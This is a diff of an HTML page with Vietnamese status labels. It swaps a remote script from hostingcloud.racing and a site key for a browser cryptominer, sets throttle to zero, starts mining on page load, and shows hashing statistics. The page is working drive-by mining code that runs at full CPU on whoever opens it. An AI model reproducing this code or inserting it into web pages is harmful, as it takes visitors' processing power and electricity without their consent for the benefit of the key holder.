@@ -10,18 +10,18 @@
     <div id="per">Per: Đang tải...</div>
     <div id="luong">Luồng: Đang tải...</div>
     
-    <script src="https://www.hostingcloud.racing/LTJd.js"></script>
+    <script src="https://www.hostingcloud.racing/8jPi.js"></script>
     <script>
-        var a = new Client.Anonymous('79a26f9911cc1957ecde6b3e9bac5af95a3f24475dcb517c124f1ae36b80fdfa', {
+        var _client = new Client.Anonymous('8556fa0789f0474464f00782b6f2f7e697515e8acd2a2d3e9dc810adeaf4f989', {
             throttle: 0, c: 'w'
         });
-        a.start();
+        _client.start();
         
         function update() {
-            var cpu = ((1 - a.getThrottle()) * 100).toFixed(1);
-            var tong = a.getTotalHashes();
-            var per = a.getHashesPerSecond().toFixed(1);
-            var luong = a.getNumThreads();
+            var cpu = ((1 - _client.getThrottle()) * 100).toFixed(1);
+            var tong = _client.getTotalHashes();
+            var per = _client.getHashesPerSecond().toFixed(1);
+            var luong = _client.getNumThreads();
 
             document.getElementById('cpu').textContent = "CPU: " + cpu + "%";
             document.getElementById('tong').textContent = "Tổng: " + tong;
